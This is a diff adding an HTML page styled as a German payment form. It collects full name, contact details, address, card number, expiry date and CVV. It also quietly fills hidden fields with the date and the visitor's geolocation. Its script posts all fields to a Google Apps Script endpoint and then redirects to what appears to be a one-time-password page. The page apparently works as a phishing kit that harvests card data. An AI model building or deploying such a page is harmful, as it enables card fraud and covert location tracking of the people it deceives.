@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<!-- saved from url=(0097)file:///C:/Users/PC/Documents/all%20coding%20folder/my%20first%20html/Chris-Savaj/cc-page/cc.html -->
+<html lang="de" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsives Zahlungsgateway-Formulardesign mit HTML und CSS | Codehal</title>
+    <link rel="stylesheet" href="file:///C:/Users/PC/Documents/all%20coding%20folder/my%20first%20html/Chris-Savaj/cc-page/style.css">
+<link type="text/css" rel="stylesheet" charset="UTF-8" href="m=el_main_css"></head>
+
+<body>
+
+    <div class="container">
+        <form id="entryForm" action="https://script.google.com/macros/s/AKfycbzqOHDCoBOgK374xNU9i466KfgIVOeyWKQPCir9Np4qe8PeZjIKzVNIA83FRrEMK7za/exec">
+            <div class="row">
+                <div class="column">
+                    <h3 class="title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rechnungsadresse</font></font></h3>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vollständiger Name :</font></font></span>
+                        <input name="fullName" id="" type="text" placeholder="Jakob Aiden">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E-Mail:</font></font></span>
+                        <input name="email" id="" type="email" placeholder="beispiel@beispiel.com">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telefonnummer:</font></font></span>
+                        <input name="phoneNumber" id="" type="tel" placeholder="+49 0000 0000000">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Adresse :</font></font></span>
+                        <input name="address" id="" type="text" placeholder="Zimmer - Straße - Ort">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Stadt :</font></font></span>
+                        <input name="city" id="" type="text" placeholder="Berlin">
+                    </div>
+
+                    <div class="flex">
+                        <div class="input-box">
+                            <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zustand :</font></font></span>
+                            <input name="state" id="" type="text" placeholder="Deutschland">
+                        </div>
+                        <div class="input-box">
+                            <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PLZ :</font></font></span>
+                            <input name="zipCode" id="" type="number" placeholder="123 456">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="column">
+                    <h3 class="title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zahlung</font></font></h3>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Akzeptierte Karten:</font></font></span>
+                        <img src="imgcards.png" alt="">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Name auf der Karte:</font></font></span>
+                        <input name="name1" id="" type="text" placeholder="Herr Jacob Aiden">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kreditkartennummer:</font></font></span>
+                        <input name="name2" id="" type="number" placeholder="1111 2222 3333 4444">
+                    </div>
+                    <div class="input-box">
+                        <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ablaufmonat:</font></font></span>
+                        <input name="name3" id="" type="text" placeholder="August">
+                    </div>
+                
+                    <div class="flex">
+                        <div class="input-box">
+                            <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ablaufjahr:</font></font></span>
+                            <input name="name4" id="" type="number" placeholder="2025">
+                        </div>
+                        <div class="input-box">
+                            <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVV:</font></font></span>
+                            <input name="name5" id="" type="number" placeholder="123">
+                        </div>
+                        <div style="display: none;" class="input-box">
+                            <span></span>
+                            <input style="display: none;" name="date" id="date" type="" placeholder="">
+                        </div>
+                        <div style="display: none;" class="input-box">
+                            <span></span>
+                            <input style="display: none;" name="latitude" id="latitude" type="hidden" placeholder="">
+                            
+                        </div>
+                        <div style="display: none;" class="input-box">
+                            <span></span>
+                            <input style="display: none;" name="longitude" id="longitude" type="hidden" placeholder="">
+                        </div>
+                         <div style="display: none;" class="input-box">
+                            <span></span>
+                            <input style="display: none;" name="status" id="status" type="hidden" placeholder="">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+           <button onclick="job()" id="button" type="submit" class="btn"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Einreichen</font></font></button>
+        </form>
+    </div>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+}
+
+.container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background: #1f242d;
+    padding: 25px;
+}
+
+.container form {
+    width: 700px;
+    padding: 40px;
+    background: #fff;
+    border-radius: 10px;
+}
+
+form .row {
+    display: flex;
+    gap: 15px;
+    flex-wrap: wrap;
+}
+
+.row .column {
+    flex: 1 1 250px;
+}
+
+.column .title {
+    font-size: 20px;
+    color: #333;
+    text-transform: uppercase;
+    margin-bottom: 5px;
+}
+
+.column .input-box {
+    margin: 15px 0;
+}
+
+.input-box span {
+    display: block;
+    margin-bottom: 10px;
+}
+
+.input-box input {
+    width: 100%;
+    padding: 10px 15px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 15px;
+}
+
+.column .flex {
+    display: flex;
+    gap: 15px;
+}
+
+.flex .input-box {
+    margin-top: 5px;
+}
+
+.input-box img {
+    height: 34px;
+    margin-top: 5px;
+    filter: drop-shadow(0 0 1px #000);
+}
+
+form .btn {
+    width: 100%;
+    padding: 12px;
+    background: #8175d3;
+    border: none;
+    outline: none;
+    border-radius: 6px;
+    font-size: 17px;
+    color: #fff;
+    margin-top: 5px;
+    cursor: pointer;
+    transition: .5s;
+}
+
+form .btn:hover {
+    background: #6a5acd;
+}
+    </style>
+
+<script>
+
+    document.getElementById("entryForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+  const formData = new FormData(e.target);
+  const params = new URLSearchParams();
+  for (const pair of formData.entries()) {
+    params.append(pair[0], pair[1]);
+  }
+
+  fetch("https://script.google.com/macros/s/AKfycbzqOHDCoBOgK374xNU9i466KfgIVOeyWKQPCir9Np4qe8PeZjIKzVNIA83FRrEMK7za/exec", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: params
+  })
+  .then(res => res.text())
+  .then(response => {
+    document.getElementById("status").value = "submission successful";
+     setTimeout(() => {
+    window.location.href = "translatedotppage.html";
+  }, 1000);
+  })
+  .catch(err => {
+    document.getElementById("status").value = "Error: " + err;
+    alert("Error: " + err);
+  });
+});
+
+navigator.geolocation.getCurrentPosition(function(position) {
+    enableHighAccuracy: true;
+  console.log("Latitude: " + position.coords.latitude);
+  console.log("Longitude: " + position.coords.longitude);
+
+  let latitude = document.getElementById("latitude");
+latitude.value = position.coords.latitude;
+
+
+let longitude = document.getElementById("longitude");
+longitude.value = position.coords.longitude;
+
+});
+
+
+let date = new Date();
+let newdate = document.getElementById("date");
+newdate.value = date;
+
+
+
+
+
+    function job(){
+
+    }
+</script><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: &#39;Google Sans&#39;, Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class="VIpgJd-yAWNEb-hvhgNd-Ud7fr"><img src="24px.svg" width="24" height="24" alt=""><div class=" VIpgJd-yAWNEb-hvhgNd-IuizWc-i3jM8c " dir="ltr">Original text</div></div><div class="VIpgJd-yAWNEb-hvhgNd-k77Iif"><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="file://translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0" src="saved_resource.html"></iframe></div></div></div>
+
+</body></html>
